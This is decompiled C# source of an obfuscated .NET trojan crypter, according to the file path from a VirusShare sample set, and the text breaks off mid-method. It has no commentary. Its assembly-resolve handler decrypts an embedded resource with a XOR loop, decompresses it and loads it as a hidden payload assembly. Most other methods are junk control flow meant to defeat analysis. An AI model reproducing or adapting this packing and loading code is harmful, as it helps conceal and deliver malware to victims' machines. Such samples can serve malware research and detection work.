// Decompiled with JetBrains decompiler
// Type: Ⴗ.Ⴗ
// Assembly: index1, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D0CDDFC5-8A53-4CCF-BF4E-C8BB50C9BEC3
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.gsr-6aecc634a06400e6a917a845023526916fd6cc619d9bbc406bd268c4b3a0a713.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Text;

namespace Ⴗ
{
  internal sealed class Ⴗ
  {
    private static bool ႥႨ;
    private static readonly char[] ႥႣ = new char[8]
    {
      'ࠍ',
      '≉',
      '┬',
      'ጌ',
      '㖚',
      'ᨨ',
      'ᨻ',
      'ㆹ'
    };
    private static readonly string[] ႥႳ = new string[1];

    internal static Assembly ႥႰ(object sender, ResolveEventArgs args)
    {
label_3:
      string str1 = Ⴗ.Ⴐ.ႥႥ(1752227534);
      string name = str1;
label_4:
      string str2 = Ⴗ.Ⴗ.ႭႰ((object) name, (object) '1', 891, 879);
      AppDomain appDomain = Ⴗ.Ⴐ.ႰႤ(264, 380);
      int num1 = 2;
      Dictionary<string, string> dictionary;
      Assembly assembly;
      Stream stream;
      byte[] buffer;
      int num2;
      int index1;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 12:
            Ⴗ.Ⴐ.ႰႨ(stream, buffer, 0, buffer.Length, 219, 206);
            index1 = 0;
            num1 = 6;
            continue;
          case 1:
            goto label_14;
          case 2:
            dictionary = (Dictionary<string, string>) Ⴗ.Ⴗ.ႭႠ(appDomain, str2, 310, 339);
            if (dictionary == null)
            {
              num1 = 8;
              continue;
            }
            goto label_34;
          case 3:
            goto label_4;
          case 4:
            buffer = new byte[Ⴗ.Ⴗ.ႭႷ(stream, 425, 437) - 1L];
            num2 = Ⴗ.Ⴗ.ႭႼ(stream, 253, 139);
            num1 = 0;
            continue;
          case 5:
            buffer[index1] ^= (byte) (index1 + num2 & (int) byte.MaxValue);
            ++index1;
            num1 = 6;
            continue;
          case 6:
            num1 = index1 < buffer.Length ? 5 : 1;
            continue;
          case 7:
            goto label_9;
          case 8:
          case 10:
            dictionary = new Dictionary<string, string>();
            Ⴗ.Ⴗ.ႭႣ(appDomain, str2, (object) dictionary, 73, 81);
            assembly = Ⴗ.Ⴐ.ႥႣ(126, 115);
            stream = Ⴗ.Ⴗ.ႭႳ(assembly, str1, 896, 934);
            num1 = 13;
            continue;
          case 9:
            goto label_3;
          case 13:
            num1 = stream != null ? 4 : 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႥႰ);
            num1 = 9;
            continue;
        }
      }
label_9:
      Ⴗ.Ⴐ.ႭႥ();
      return (Assembly) null;
label_14:
      MemoryStream memoryStream = new MemoryStream();
      DeflateStream deflateStream = new DeflateStream((Stream) new MemoryStream(buffer), CompressionMode.Decompress, true);
      try
      {
        int num3 = 2;
        byte[] numArray;
        int num4;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 1:
              goto label_26;
            case 3:
            case 6:
              Ⴗ.Ⴐ.ႰႭ((Stream) memoryStream, numArray, 0, num4, 316, 320);
              goto case 4;
            case 4:
              num3 = (num4 = Ⴗ.Ⴐ.ႰႨ((Stream) deflateStream, numArray, 0, numArray.Length, 251, 237)) > 0 ? 3 : 1;
              continue;
            case 5:
              num3 = 4;
              continue;
            default:
              numArray = new byte[1024];
              goto case 5;
          }
        }
      }
      finally
      {
        int num5 = 2;
        while (true)
        {
          switch (num5)
          {
            case 1:
            case 4:
              goto label_25;
            case 5:
              goto label_24;
            default:
              num5 = deflateStream == null ? 4 : 5;
              continue;
          }
        }
label_24:
        deflateStream.Dispose();
label_25:;
      }
label_26:
      int num6 = 1;
label_27:
      Assembly data;
      string[] manifestResourceNames;
      int index2;
      string key;
      while (true)
      {
        switch (num6)
        {
          case 0:
            key = manifestResourceNames[index2];
            goto case 10;
          case 2:
            goto label_37;
          case 3:
          case 8:
            num6 = !dictionary.ContainsKey(args.Name) ? 2 : 5;
            continue;
          case 4:
            num6 = 3;
            continue;
          case 5:
          case 9:
            goto label_36;
          case 6:
            num6 = index2 < manifestResourceNames.Length ? 0 : 4;
            continue;
          case 10:
            dictionary[key] = key;
            ++index2;
            num6 = 6;
            continue;
          case 11:
            goto label_34;
          case 12:
            appDomain.SetData(name, (object) data);
            manifestResourceNames = data.GetManifestResourceNames();
            index2 = 0;
            num6 = 6;
            continue;
          default:
            data = Ⴗ.Ⴗ.ႥႤ(Ⴗ.Ⴐ.ႰႥ(memoryStream, 297, 365), (byte[]) null, Ⴗ.Ⴐ.ႰႰ(assembly, 618, 568), 765, 764);
            num6 = 12;
            continue;
        }
      }
label_36:
      return data;
label_37:
      return (Assembly) null;
label_34:
      data = (Assembly) appDomain.GetData(name);
      num6 = 3;
      goto label_27;
    }

    static Ⴗ() => Ⴗ.Ⴗ.ႥႭ();

    internal static byte Ⴄ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(539, 604), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 461, 386);
      Ⴗ.Ⴐ.ႨႷ();
      return 5;
    }

    internal static string Ⴈ()
    {
label_3:
      int num = 316 < 1264 / 4 - 260 ? 6 : 5;
      while (true)
      {
        switch (num)
        {
          case 2:
          case 6:
            goto label_5;
          case 3:
            goto label_3;
          case 5:
            Ⴗ.Ⴗ.Ⴈ();
            num = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴈ);
            num = 3;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႨႨ();
      return (string) null;
    }

    internal static string Ⴍ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(690, 763), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 682, 763);
      Ⴗ.Ⴐ.ႭႤ();
      return (string) null;
    }

    internal static string Ⴅ()
    {
label_3:
      int num1 = 1138;
label_4:
      int num2 = num1 * num1;
      int num3 = num1 + num2;
label_5:
      int num4 = num3 % 2 != 0 ? 6 : 2;
      while (true)
      {
        switch (num4)
        {
          case 0:
            goto label_5;
          case 1:
          case 6:
            goto label_7;
          case 2:
            Ⴗ.Ⴗ.Ⴅ();
            num4 = 6;
            continue;
          case 4:
            goto label_3;
          case 5:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴅ);
            num4 = 4;
            continue;
        }
      }
label_7:
      Ⴗ.Ⴐ.ႥႤ();
      return (string) null;
    }

    internal static int Ⴐ()
    {
label_3:
      int num1 = 1806;
      int num2 = num1 * num1;
label_4:
      num2 = num1 + num2;
label_5:
      int num3 = num2 % 2 != 0 ? 0 : 4;
      while (true)
      {
        switch (num3)
        {
          case 0:
            goto label_7;
          case 2:
          case 6:
            goto label_4;
          case 3:
            goto label_5;
          case 4:
            Ⴗ.Ⴗ.Ⴐ();
            num3 = 0;
            continue;
          case 5:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴐ);
            num3 = 5;
            continue;
        }
      }
label_7:
      Ⴗ.Ⴗ.Ⴓ();
      return 6;
    }

    internal static int Ⴀ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(128, 202), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 835, 785);
      int num = (int) Ⴗ.Ⴐ.ႭႰ();
      return 7;
    }

    internal static long Ⴃ()
    {
      Ⴗ.Ⴗ.ႥႼ(Ⴗ.Ⴗ.ႥႷ(425, 482), Ⴗ.Ⴗ.ႥႠ(1752227528), (object) null, 969, 922);
      Ⴗ.Ⴗ.Ⴗ();
      return 11;
    }

    internal static int Ⴓ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(229, 169), Ⴗ.Ⴗ.ႥႠ(1752227528), 445, 424);
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 12:
            goto label_3;
          case 1:
            goto label_9;
          case 2:
            num1 = numArray[index] < (byte) 8 ? 8 : 15;
            continue;
          case 3:
            num1 = (byte) 206 == numArray[index] ? 17 : 6;
            continue;
          case 4:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 14;
            continue;
          case 5:
          case 9:
          case 18:
            num1 = numArray[index] < (byte) 224 ? 13 : 10;
            continue;
          case 6:
            Ⴗ.Ⴐ.Ⴐ();
            goto case 17;
          case 7:
            goto label_18;
          case 8:
            goto label_4;
          case 10:
            num1 = (byte) 224 == numArray[index] ? 7 : 19;
            continue;
          case 11:
            num1 = numArray[index] < (byte) 206 ? 1 : 3;
            continue;
          case 13:
            goto label_14;
          case 14:
            ++index;
            num1 = 11;
            continue;
          case 15:
            num1 = (byte) 8 == numArray[index] ? 14 : 4;
            continue;
          case 17:
            ++index;
            num1 = 9;
            continue;
          case 19:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 7;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴓ);
            num1 = 12;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႨႭ();
      return 11;
label_9:
      return 15;
label_14:
      return 12;
label_18:
      int num2 = index + 1;
      return 13;
    }

    internal static void Ⴗ()
    {
      int index;
      switch (4)
      {
        case 0:
        case 1:
          Ⴗ.Ⴐ.ႥႨ();
          break;
        case 2:
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(373, 312), Ⴗ.Ⴗ.ႥႠ(1752227528), 983, 961);
label_7:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 25;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  ++index;
                  num1 = 10;
                  continue;
                case 1:
                  goto label_12;
                case 2:
                case 19:
                  ++index;
                  num1 = 13;
                  continue;
                case 3:
                  num1 = (byte) 186 == numArray[index] ? 4 : 15;
                  continue;
                case 4:
                  goto label_30;
                case 5:
                  Ⴗ.Ⴗ.Ⴍ();
                  num1 = 20;
                  continue;
                case 6:
                  goto label_17;
                case 7:
                  goto label_7;
                case 8:
                  num1 = (byte) 224 == numArray[index] ? 0 : 9;
                  continue;
                case 9:
                  int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
                  num1 = 0;
                  continue;
                case 10:
                  num1 = numArray[index] < (byte) 13 ? 6 : 18;
                  continue;
                case 11:
                case 13:
                  num1 = numArray[index] < (byte) 224 ? 1 : 8;
                  continue;
                case 12:
                  num1 = numArray[index] < (byte) 206 ? 24 : 14;
                  continue;
                case 14:
                  num1 = (byte) 206 == numArray[index] ? 2 : 17;
                  continue;
                case 15:
                case 16:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 4;
                  continue;
                case 17:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 2;
                  continue;
                case 18:
                  num1 = (byte) 13 == numArray[index] ? 20 : 5;
                  continue;
                case 20:
                  ++index;
                  num1 = 23;
                  continue;
                case 21:
                  ++index;
                  num1 = 12;
                  continue;
                case 23:
                  num1 = numArray[index] < (byte) 186 ? 27 : 3;
                  continue;
                case 24:
                  goto label_4;
                case 25:
                  num1 = (byte) 8 == numArray[index] ? 21 : 26;
                  continue;
                case 26:
                  Ⴗ.Ⴐ.Ⴀ();
                  goto case 21;
                case 27:
                  goto label_22;
                default:
                  goto label_6;
              }
            }
label_12:
            return;
label_17:
            return;
label_4:
            return;
label_22:
            return;
label_6:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴗ);
            return;
label_30:
            int num3 = index + 1;
            return;
          }
          goto case 0;
        case 3:
          break;
        default:
          index = 0;
          goto case 2;
      }
    }

    internal static int Ⴜ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(622, 545), Ⴗ.Ⴗ.ႥႠ(1752227528), 168, 191);
      int num1 = 7;
      while (true)
      {
        switch (num1)
        {
          case 0:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 14;
            continue;
          case 1:
            num1 = (byte) 224 == numArray[index] ? 11 : 13;
            continue;
          case 2:
            num1 = (byte) 8 == numArray[index] ? 9 : 12;
            continue;
          case 3:
            ++index;
            num1 = 15;
            continue;
          case 4:
            goto label_4;
          case 5:
            num1 = numArray[index] < (byte) 206 ? 18 : 20;
            continue;
          case 6:
            goto label_19;
          case 7:
            num1 = numArray[index] < (byte) 8 ? 4 : 2;
            continue;
          case 8:
            num1 = numArray[index] < (byte) 13 ? 6 : 23;
            continue;
          case 9:
            ++index;
            num1 = 5;
            continue;
          case 10:
            goto label_3;
          case 11:
            ++index;
            num1 = 8;
            continue;
          case 12:
          case 19:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 9;
            continue;
          case 13:
          case 22:
            Ⴗ.Ⴐ.Ⴗ();
            num1 = 11;
            continue;
          case 14:
          case 16:
            goto label_23;
          case 15:
            num1 = numArray[index] < (byte) 224 ? 24 : 1;
            continue;
          case 17:
            Ⴗ.Ⴐ.Ⴓ();
            goto case 3;
          case 18:
            goto label_9;
          case 20:
            num1 = (byte) 206 == numArray[index] ? 3 : 17;
            continue;
          case 23:
            num1 = (byte) 13 == numArray[index] ? 14 : 0;
            continue;
          case 24:
            goto label_14;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.Ⴜ);
            num1 = 10;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႨႨ();
      return 11;
label_9:
      return 14;
label_14:
      return 14;
label_19:
      return 5;
label_23:
      int num3 = index + 1;
      return 0;
    }

    internal static object ႨႤ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(771, 850), Ⴗ.Ⴗ.ႥႠ(1752227528), 994, 1018);
      int num1 = 20;
      while (true)
      {
        switch (num1)
        {
          case 0:
            num1 = (byte) 206 == numArray[index] ? 19 : 23;
            continue;
          case 1:
            ++index;
            num1 = 6;
            continue;
          case 2:
            ++index;
            num1 = 26;
            continue;
          case 3:
          case 17:
            goto label_19;
          case 4:
            Ⴗ.Ⴗ.Ⴐ();
            num1 = 15;
            continue;
          case 5:
            goto label_24;
          case 6:
            num1 = numArray[index] < (byte) 186 ? 5 : 21;
            continue;
          case 7:
            goto label_28;
          case 8:
            num1 = (byte) 224 == numArray[index] ? 2 : 16;
            continue;
          case 10:
          case 12:
            Ⴗ.Ⴗ.Ⴀ();
            num1 = 1;
            continue;
          case 11:
            goto label_4;
          case 13:
            goto label_14;
          case 14:
          case 25:
            num1 = (byte) 13 == numArray[index] ? 1 : 10;
            continue;
          case 15:
            ++index;
            num1 = 18;
            continue;
          case 16:
            Ⴗ.Ⴐ.Ⴀ();
            goto case 2;
          case 18:
            num1 = numArray[index] < (byte) 206 ? 24 : 0;
            continue;
          case 19:
            ++index;
            num1 = 22;
            continue;
          case 20:
            num1 = numArray[index] < (byte) 8 ? 11 : 27;
            continue;
          case 21:
            num1 = (byte) 186 == numArray[index] ? 7 : 28;
            continue;
          case 22:
            num1 = numArray[index] < (byte) 224 ? 13 : 8;
            continue;
          case 23:
            Ⴗ.Ⴗ.Ⴀ();
            num1 = 19;
            continue;
          case 24:
            goto label_9;
          case 26:
            num1 = numArray[index] < (byte) 13 ? 17 : 14;
            continue;
          case 27:
            num1 = (byte) 8 == numArray[index] ? 15 : 4;
            continue;
          case 28:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 7;
            continue;
          case 29:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႤ);
            num1 = 29;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႨႠ();
      return (object) null;
label_9:
      return (object) null;
label_14:
      return (object) null;
label_19:
      return (object) null;
label_24:
      return (object) null;
label_28:
      int num2 = index + 1;
      return (object) null;
    }

    internal static void ႨႨ()
    {
      int index;
      switch (4)
      {
        case 0:
        case 2:
          Ⴗ.Ⴐ.ႭႣ();
          break;
        case 1:
        case 3:
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(165, 246), Ⴗ.Ⴗ.ႥႠ(1752227528), 595, 586);
label_6:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 6;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  goto label_39;
                case 1:
                  num1 = numArray[index] < (byte) 224 ? 21 : 14;
                  continue;
                case 2:
                  num1 = numArray[index] < (byte) 103 ? 35 : 9;
                  continue;
                case 3:
                case 34:
                  num1 = numArray[index] < (byte) 13 ? 11 : 20;
                  continue;
                case 4:
                  Ⴗ.Ⴐ.Ⴜ();
                  num1 = 25;
                  continue;
                case 5:
                  goto label_6;
                case 6:
                  num1 = (byte) 8 == numArray[index] ? 28 : 15;
                  continue;
                case 7:
                  int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
                  num1 = 22;
                  continue;
                case 8:
                  num1 = (byte) 206 == numArray[index] ? 30 : 13;
                  continue;
                case 9:
                  num1 = (byte) 103 == numArray[index] ? 0 : 27;
                  continue;
                case 10:
                  int num3 = (int) Ⴗ.Ⴗ.Ⴄ();
                  num1 = 17;
                  continue;
                case 11:
                  goto label_16;
                case 12:
                  ++index;
                  num1 = 2;
                  continue;
                case 13:
                  Ⴗ.Ⴗ.Ⴈ();
                  num1 = 30;
                  continue;
                case 14:
                  num1 = (byte) 224 == numArray[index] ? 22 : 7;
                  continue;
                case 15:
                case 37:
                  int num4 = (int) Ⴗ.Ⴐ.Ⴃ();
                  num1 = 28;
                  continue;
                case 16:
                  num1 = numArray[index] < (byte) 79 ? 32 : 19;
                  continue;
                case 17:
                  ++index;
                  num1 = 33;
                  continue;
                case 18:
                  goto label_21;
                case 19:
                  num1 = (byte) 79 == numArray[index] ? 12 : 31;
                  continue;
                case 20:
                  num1 = (byte) 13 == numArray[index] ? 17 : 10;
                  continue;
                case 21:
                  goto label_11;
                case 22:
                  ++index;
                  num1 = 34;
                  continue;
                case 23:
                  num1 = numArray[index] < (byte) 206 ? 26 : 8;
                  continue;
                case 25:
                  ++index;
                  num1 = 16;
                  continue;
                case 26:
                  goto label_40;
                case 27:
                  Ⴗ.Ⴐ.Ⴄ();
                  num1 = 0;
                  continue;
                case 28:
                  ++index;
                  num1 = 23;
                  continue;
                case 29:
                  num1 = (byte) 186 == numArray[index] ? 25 : 4;
                  continue;
                case 30:
                  ++index;
                  num1 = 1;
                  continue;
                case 31:
                  Ⴗ.Ⴐ.Ⴓ();
                  goto case 12;
                case 32:
                  goto label_26;
                case 33:
                  num1 = numArray[index] < (byte) 186 ? 18 : 29;
                  continue;
                case 35:
                  goto label_31;
                case 36:
                  goto label_41;
                default:
                  goto label_5;
              }
            }
label_16:
            return;
label_21:
            return;
label_11:
            return;
label_40:
            return;
label_26:
            return;
label_31:
            return;
label_41:
            return;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႨ);
            return;
label_39:
            int num5 = index + 1;
            return;
          }
          goto case 0;
        default:
          index = 0;
          goto case 1;
      }
    }

    internal static int ႨႭ()
    {
label_3:
      int index = 0;
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(237, 185), Ⴗ.Ⴗ.ႥႠ(1752227528), 60, 38);
      int num1 = 9;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
          case 4:
            num1 = (byte) 8 == numArray[index] ? 14 : 7;
            continue;
          case 1:
            num1 = (byte) 206 == numArray[index] ? 6 : 17;
            continue;
          case 2:
            goto label_14;
          case 5:
            num1 = numArray[index] < (byte) 206 ? 13 : 1;
            continue;
          case 6:
            ++index;
            num1 = 19;
            continue;
          case 7:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 14;
            continue;
          case 8:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 16;
            continue;
          case 9:
            num1 = numArray[index] < (byte) 8 ? 10 : 4;
            continue;
          case 10:
            goto label_4;
          case 11:
            goto label_3;
          case 12:
            num1 = (byte) 224 == numArray[index] ? 16 : 8;
            continue;
          case 13:
          case 18:
            goto label_9;
          case 14:
            ++index;
            num1 = 5;
            continue;
          case 16:
            goto label_18;
          case 17:
            Ⴗ.Ⴗ.Ⴈ();
            num1 = 6;
            continue;
          case 19:
            num1 = numArray[index] < (byte) 224 ? 2 : 12;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႭ);
            num1 = 11;
            continue;
        }
      }
label_4:
      Ⴗ.Ⴐ.ႥႨ();
      return 15;
label_9:
      return 5;
label_14:
      return 1;
label_18:
      int num3 = index + 1;
      return 14;
    }

    internal static void ႨႥ()
    {
      switch (1)
      {
        case 0:
          break;
        case 2:
        case 3:
        case 4:
          Ⴗ.Ⴐ.ႨႭ();
          break;
        default:
          int index = 0;
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(539, 590), Ⴗ.Ⴗ.ႥႠ(1752227528), 632, 611);
label_6:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 16;
            while (true)
            {
              switch (num1)
              {
                case 0:
                  Ⴗ.Ⴗ.Ⴀ();
                  num1 = 9;
                  continue;
                case 1:
                  ++index;
                  num1 = 7;
                  continue;
                case 2:
                  goto label_3;
                case 3:
                  goto label_11;
                case 5:
                  num1 = (byte) 224 == numArray[index] ? 11 : 8;
                  continue;
                case 6:
                case 10:
                  goto label_6;
                case 7:
                  num1 = numArray[index] < (byte) 206 ? 17 : 12;
                  continue;
                case 8:
                  Ⴗ.Ⴗ.Ⴃ();
                  num1 = 11;
                  continue;
                case 9:
                  ++index;
                  num1 = 14;
                  continue;
                case 11:
                  goto label_19;
                case 12:
                  num1 = (byte) 206 == numArray[index] ? 9 : 0;
                  continue;
                case 13:
                  Ⴗ.Ⴗ.Ⴐ();
                  num1 = 1;
                  continue;
                case 14:
                  num1 = numArray[index] < (byte) 224 ? 3 : 5;
                  continue;
                case 15:
                  goto label_22;
                case 16:
                  num1 = (byte) 8 == numArray[index] ? 1 : 13;
                  continue;
                case 17:
                  goto label_21;
                default:
                  goto label_5;
              }
            }
label_3:
            return;
label_11:
            return;
label_22:
            return;
label_21:
            return;
label_5:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႥ);
            return;
label_19:
            int num2 = index + 1;
            return;
          }
          goto case 2;
      }
    }

    internal static byte ႨႰ()
    {
label_3:
      int index = 0;
label_4:
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(617, 575), Ⴗ.Ⴗ.ႥႠ(1752227528), 453, 473);
      int num1 = 20;
      while (true)
      {
        switch (num1)
        {
          case 0:
            Ⴗ.Ⴐ.Ⴅ();
            num1 = 6;
            continue;
          case 1:
            int num2 = (int) Ⴗ.Ⴐ.Ⴃ();
            num1 = 10;
            continue;
          case 3:
            num1 = (byte) 224 == numArray[index] ? 10 : 1;
            continue;
          case 4:
            goto label_20;
          case 5:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 13;
            continue;
          case 6:
          case 16:
            ++index;
            num1 = 23;
            continue;
          case 7:
            Ⴗ.Ⴗ.Ⴅ();
            num1 = 24;
            continue;
          case 8:
            goto label_10;
          case 9:
            num1 = numArray[index] < (byte) 13 ? 4 : 18;
            continue;
          case 10:
          case 21:
            ++index;
            num1 = 9;
            continue;
          case 11:
            goto label_3;
          case 12:
            goto label_5;
          case 13:
            goto label_24;
          case 14:
            goto label_4;
          case 15:
            goto label_15;
          case 17:
            num1 = (byte) 206 == numArray[index] ? 24 : 7;
            continue;
          case 18:
            num1 = (byte) 13 == numArray[index] ? 13 : 5;
            continue;
          case 19:
            num1 = numArray[index] < (byte) 224 ? 15 : 3;
            continue;
          case 20:
            num1 = numArray[index] < (byte) 8 ? 12 : 22;
            continue;
          case 22:
            num1 = (byte) 8 == numArray[index] ? 6 : 0;
            continue;
          case 23:
            num1 = numArray[index] < (byte) 206 ? 8 : 17;
            continue;
          case 24:
            ++index;
            num1 = 19;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႰ);
            num1 = 11;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႨႠ();
      return 13;
label_10:
      return 1;
label_15:
      return 6;
label_20:
      return 8;
label_24:
      int num3 = index + 1;
      return 11;
    }

    internal static string ႨႠ()
    {
label_3:
      int index = 0;
label_4:
      byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(740, 691), Ⴗ.Ⴗ.ႥႠ(1752227528), 737, 767);
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
            Ⴗ.Ⴐ.Ⴜ();
            num1 = 24;
            continue;
          case 1:
            num1 = (byte) 224 == numArray[index] ? 24 : 0;
            continue;
          case 2:
            num1 = numArray[index] < (byte) 8 ? 28 : 3;
            continue;
          case 3:
            num1 = (byte) 8 == numArray[index] ? 17 : 21;
            continue;
          case 4:
            goto label_26;
          case 5:
            num1 = numArray[index] < (byte) 79 ? 15 : 19;
            continue;
          case 6:
            goto label_35;
          case 7:
            ++index;
            goto case 11;
          case 8:
            Ⴗ.Ⴗ.Ⴍ();
            num1 = 23;
            continue;
          case 9:
            num1 = (byte) 186 == numArray[index] ? 16 : 12;
            continue;
          case 10:
          case 23:
            ++index;
            num1 = 26;
            continue;
          case 11:
            num1 = 14;
            continue;
          case 12:
            Ⴗ.Ⴗ.Ⴃ();
            num1 = 16;
            continue;
          case 13:
            num1 = (byte) 206 == numArray[index] ? 23 : 8;
            continue;
          case 14:
            num1 = numArray[index] < (byte) 186 ? 4 : 9;
            continue;
          case 15:
            goto label_31;
          case 16:
            ++index;
            num1 = 5;
            continue;
          case 17:
            ++index;
            num1 = 33;
            continue;
          case 18:
            goto label_10;
          case 19:
            num1 = (byte) 79 == numArray[index] ? 6 : 20;
            continue;
          case 20:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 6;
            continue;
          case 21:
            Ⴗ.Ⴐ.Ⴄ();
            num1 = 17;
            continue;
          case 22:
            goto label_15;
          case 24:
            ++index;
            num1 = 32;
            continue;
          case 26:
            num1 = numArray[index] < (byte) 224 ? 22 : 1;
            continue;
          case 27:
            goto label_3;
          case 28:
            goto label_5;
          case 29:
            int num2 = (int) Ⴗ.Ⴗ.Ⴄ();
            num1 = 7;
            continue;
          case 30:
            num1 = (byte) 13 == numArray[index] ? 7 : 29;
            continue;
          case 31:
            goto label_20;
          case 32:
            num1 = numArray[index] < (byte) 13 ? 31 : 30;
            continue;
          case 33:
            num1 = numArray[index] < (byte) 206 ? 18 : 13;
            continue;
          case 34:
            goto label_4;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (Ⴗ.Ⴗ.ႨႠ);
            num1 = 27;
            continue;
        }
      }
label_5:
      Ⴗ.Ⴐ.ႥႨ();
      return (string) null;
label_10:
      return (string) null;
label_15:
      return (string) null;
label_20:
      return (string) null;
label_26:
      return (string) null;
label_31:
      return (string) null;
label_35:
      int num3 = index + 1;
      return (string) null;
    }

    internal static void ႨႣ()
    {
      switch (3)
      {
        case 0:
        case 1:
        case 2:
        case 4:
          Ⴗ.Ⴗ.ႨႥ();
          break;
        default:
          int index = 0;
          byte[] numArray = (byte[]) Ⴗ.Ⴐ.ႰႠ(Ⴗ.Ⴗ.ႥႷ(121, 32), Ⴗ.Ⴗ.ႥႠ(1752227528), 776, 808);
label_5:
          while (numArray[index] >= (byte) 8)
          {
            int num1 = 17;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 21:
                  Ⴗ.Ⴐ.Ⴐ();
                  goto case 34;
                case 1:
                  num1 = (byte) 66 == numArray[index] ? 27 : 6;
                  continue;
                case 2:
                  Ⴗ.Ⴗ.Ⴍ();
                  num1 = 26;
                  continue;
                case 3:
                  num1 = numArray[index] < (byte) 224 ? 4 : 8;
                  continue;
                case 4:
                  goto label_10;
                case 5:
                  num1 = numArray[index] < (byte) 79 ? 19 : 11;
                  continue;
                case 6:
                  Ⴗ.Ⴐ.Ⴗ();
                  num1 = 27;
                  continue;
                case 7:
                  num1 = numArray[index] < (byte) 66 ? 36 : 1;
                  continue;
                case 8:
                  num1 = (byte) 224 == numArray[index] ? 10 : 32;
                  continue;
                case 10:
                  ++index;
                  num1 = 41;
                  continue;
                case 11:
                  num1 = (byte) 79 == numArray[index] ? 12 : 24;
                  continue;
                case 12:
                  ++index;
                  num1 = 42;
                  continue;
                case 13:
                  goto label_30;
                case 14:
                  ++index;
                  num1 = 3;
                  continue;
                case 15:
                case 38:
                  num1 = (byte) 206 == numArray[index] ? 14 : 37;
                  continue;
                case 16:
                  num1 = numArray[index] < (byte) 186 ? 18 : 23;
                  continue;
                case 17:
